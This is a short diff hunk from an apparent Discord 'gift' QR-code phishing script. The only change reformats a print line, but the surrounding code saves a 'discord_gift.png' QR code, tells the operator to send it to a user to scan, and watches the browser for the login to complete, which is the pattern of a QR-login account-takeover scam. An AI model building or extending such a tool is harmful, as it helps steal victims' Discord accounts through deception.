@@ -66,7 +66,7 @@ def main():
     paste_template()
 
     print('- ** QR Code has been generated. ** > discord_gift.png')
-    print('- ** Send the QR Code to user and scan. ** Waiting..')
+    print('- ** Send the QR Code to user and scan. Waiting.. **')
     
     while True:
         if discord_login != driver.current_url:
